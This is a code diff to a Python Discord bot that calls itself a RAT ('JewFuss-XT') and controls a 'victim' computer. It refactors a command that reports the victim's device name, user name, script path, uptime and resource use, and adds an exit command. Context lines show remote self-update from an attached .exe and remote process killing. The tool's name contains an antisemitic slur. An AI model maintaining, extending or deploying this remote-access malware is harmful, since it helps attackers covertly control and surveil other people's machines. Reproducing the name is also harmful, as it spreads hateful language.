@@ -54,9 +54,10 @@ import os
 import re
 
 TOKEN = "bot token" # Do not remove or modify this comment (easy compiler looks for this) - 23r98h
-version = "1.0.10.0" # Replace with current JewFuss-XT version (easy compiler looks for this to check for updates, so DO NOT MODIFY THIS COMMENT) - 25c75g
+version = "1.0.11.0" # Replace with current JewFuss-XT version (easy compiler looks for this to check for updates, so DO NOT MODIFY THIS COMMENT) - 25c75g
 USE_TRAY_ICON = False # Enables Tray icon allowing you to exit the bot on the desktop easily, used for testing or if used as a remote desktop tool | Default: False - 28f93g
 
+starttime = time.perf_counter()
 intents = discord.Intents.all()
 
 bot = commands.Bot(command_prefix='$', intents=intents)
@@ -102,6 +103,11 @@ def tray_on_exit_clicked(icon, item):
     icon.visible = False
     icon.stop()
     os._exit(0)
+
+DEV_NAME = platform.node()
+USER_NAME = getpass.getuser()
+SCRIPT_PATH = os.path.abspath(sys.argv[0])
+BOT_PROC = psutil.Process(os.getpid())
 
 @bot.command(help="Updates JewFuss using the attached .exe file. (Must be a compiled installer, not a direct JewFuss executable)", usage="$update")
 async def update(ctx):
@@ -183,47 +189,42 @@ async def ver(ctx):
 @bot.command(help="Shows victims device status including uptime, resource usage, etc.", usage="$status")
 async def status(ctx):
     global version
-    if True:
-        # ── Names
-        dev_name = platform.node()
-        user_name = getpass.getuser()
 
-        # ── Uptime (System & Bot)
-        boot_time = psutil.boot_time()
-        system_uptime = time.time() - boot_time
-        program_uptime = time.time() - psutil.Process(os.getpid()).create_time()
+    boot_time = psutil.boot_time()
+    system_uptime = time.time() - boot_time
+    program_uptime = time.time() - BOT_PROC.create_time()
 
-        def format_duration(seconds):
-            m, s = divmod(int(seconds), 60)
-            h, m = divmod(m, 60)
-            d, h = divmod(h, 24)
-            return f"{d}d {h}h {m}m {s}s"
+    def format_duration(seconds):
+        m, s = divmod(int(seconds), 60)
+        h, m = divmod(m, 60)
+        d, h = divmod(h, 24)
+        return f"{d}d {h}h {m}m {s}s"
 
-        # ── CPU & RAM Usage
-        cpu_usage = psutil.cpu_percent(interval=1)
-        proc = psutil.Process(os.getpid())
-        rat_cpu = proc.cpu_percent(interval=1)
-        rat_mem = proc.memory_info().rss / (1024**2)
-        total_mem = psutil.virtual_memory().total / (1024**2)
+    psutil.cpu_percent(None)
+    BOT_PROC.cpu_percent(None)
+    await asyncio.sleep(1)
+    cpu_usage = psutil.cpu_percent(None)
+    rat_cpu = BOT_PROC.cpu_percent(None)
 
-        # ── Script Location
-        script_path = os.path.abspath(sys.argv[0])
+    rat_mem = BOT_PROC.memory_info().rss / (1024**2)
+    total_mem = psutil.virtual_memory().total / (1024**2)
 
-        # ── Embed
-        embed = discord.Embed(
-            title=f"`{dev_name}/{user_name}` Status",
-            color=discord.Color.blue()
-        )
-        
-        if ctx.author.guild_permissions.administrator:
-            embed.add_field(name="Script Location", value=f"`{script_path}`", inline=False)
-        embed.add_field(name="RAT Memory Usage", value=f"`{rat_mem:.2f}/{total_mem:.0f} MB`", inline=True)
-        embed.add_field(name="RAT CPU Usage", value=f"`{rat_cpu}%`", inline=True)
-        embed.add_field(name="System Uptime", value=f"`{format_duration(system_uptime)}`", inline=False)
-        embed.add_field(name="Bot Uptime", value=f"`{format_duration(program_uptime)}`", inline=False)
-        embed.add_field(name="System CPU Usage", value=f"`{cpu_usage}%`", inline=False)
-        embed.add_field(name="Version", value=f"`{version}`", inline=False)
-        await ctx.send(embed=embed)
+    embed = discord.Embed(
+        title=f"`{DEV_NAME}/{USER_NAME}` Status",
+        color=discord.Color.blue()
+    )
+
+    if ctx.author.guild_permissions.administrator:
+        embed.add_field(name="Script Location", value=f"`{SCRIPT_PATH}`", inline=False)
+
+    embed.add_field(name="RAT Memory Usage", value=f"`{rat_mem:.2f}/{total_mem:.0f} MB`", inline=True)
+    embed.add_field(name="RAT CPU Usage", value=f"`{rat_cpu}%`", inline=True)
+    embed.add_field(name="System Uptime", value=f"`{format_duration(system_uptime)}`", inline=False)
+    embed.add_field(name="RAT Uptime", value=f"`{format_duration(program_uptime)}`", inline=False)
+    embed.add_field(name="System CPU Usage", value=f"`{cpu_usage}%`", inline=False)
+    embed.add_field(name="Version", value=f"`{version}`", inline=False)
+
+    await ctx.send(embed=embed)
 
 def check_permissions(file_path):
     permissions = {
@@ -849,7 +850,9 @@ async def on_guild_join(guild):
 
 @bot.event
 async def on_ready():
-    global tray_icon, version
+    global tray_icon, starttime, version
+    if starttime is None:
+        starttime = time.perf_counter()
     in_server_amount = 0
     logon_date = datetime.datetime.now().strftime("Latest logon: %m/%d/%Y %H:%M:%S") + f" (UTC{'-' if (offset := (time.altzone if time.localtime().tm_isdst else time.timezone) // 3600) < 0 else '+'}{abs(offset)})"
 
@@ -879,16 +882,21 @@ async def on_ready():
     
         print(f'Bot logged in as "{bot.user.name}" on {in_server_amount} server(s)')
         
-        if not USE_TRAY_ICON or tray_icon is not None:
-            return
+    if not USE_TRAY_ICON or tray_icon is not None:
+        return
 
-        print("Starting tray icon...")
-        menu = pystray.Menu(pystray.MenuItem(f"Version: {version}", None), pystray.MenuItem("Exit", tray_on_exit_clicked))
-        tray_icon = pystray.Icon("JewFuss-XT", tray_image, TRAY_TITLE, menu)
-        tray_icon.title = TRAY_TOOLTIP
-        tray_icon.run_detached()
-        print("tray icon started")
+    print("Starting tray icon...")
+    menu = pystray.Menu(pystray.MenuItem(f"Version: {version}", None), pystray.MenuItem("Exit", tray_on_exit_clicked))
+    tray_icon = pystray.Icon("JewFuss-XT", tray_image, TRAY_TITLE, menu)
+    tray_icon.title = TRAY_TOOLTIP
+    tray_icon.run_detached()
+    print("tray icon started")
     
+    psutil.cpu_percent(None)
+    BOT_PROC.cpu_percent(None)
+    print(f"[+{(time.perf_counter() - starttime) * 1000:.2f}ms] Finished initialization.") 
+    starttime = None
+      
 @bot.event
 async def on_message(message):
     if message.author.bot:
@@ -2715,12 +2723,12 @@ async def kill(ctx, arg: str = ""):
     try:
         pid = int(arg)
         if pid == os.getpid():
-            await ctx.send(f"{arg} matched the bot process, please use `$estop` instead to close the bot.")
+            await ctx.send(f"{arg} matched the bot process, please use `$exit` instead to close the bot.")
             return
         process = psutil.Process(pid)
         try:
             if os.path.normcase(os.path.abspath(process.exe())) == os.path.normcase(os.path.abspath(sys.executable)):
-                await ctx.send(f"{arg} matched the bot process, please use `$estop` instead to close the bot.")
+                await ctx.send(f"{arg} matched the bot process, please use `$exit` instead to close the bot.")
                 return
         except Exception:
             pass
@@ -2827,7 +2835,7 @@ async def kill(ctx, arg: str = ""):
                     pass
 
         if terminated == 0 and self_matched:
-            await ctx.send(f"{arg} matched the bot process, please use `$estop` instead to close the bot.")
+            await ctx.send(f"{arg} matched the bot process, please use `$exit` instead to close the bot.")
         elif terminated > 0:
             await ctx.send(f"Terminated **{terminated}** processes with the name `{arg}`")
         else:
@@ -3021,8 +3029,15 @@ async def commands(ctx, search: str = ""):
 async def estop(ctx):
     if ctx.author.guild_permissions.administrator:
         await ctx.send("Force stopping bot...")
-        await bot.close()
         os._exit(0)
+    else:
+        await ctx.send("You don't have permissions to do this.")
+        
+@bot.command(aliases=["stop"], help="Cloeses the bot.", usage="$exit")
+async def exit(ctx):
+    if ctx.author.guild_permissions.administrator:
+        await ctx.send("Shutting down bot...")
+        sys.exit(0)
     else:
         await ctx.send("You don't have permissions to do this.")
 
@@ -3030,11 +3045,19 @@ try:
     if "--version" in sys.argv:
         print(version)
         sys.exit(0)
-    
-    bot.run(TOKEN, reconnect=True)
+    else:
+        bot.run(TOKEN, reconnect=True)
+
 except discord.errors.LoginFailure:
-    exit("\n\033[91mError: Invalid bot token.\033[0m")
+    print("\n\033[91mError: Invalid bot token.\033[0m")
+    sys.exit(1)
+
 except KeyboardInterrupt:
-    exit("\n\033[91mExiting...\033[0m")
-    bot.close()
-    sys.exit(0)
+    print("\n\033[91mExiting...\033[0m")
+
+finally:
+    if tray_icon is not None:
+        try:
+            tray_icon.stop()
+        except Exception as e:
+            print(e)
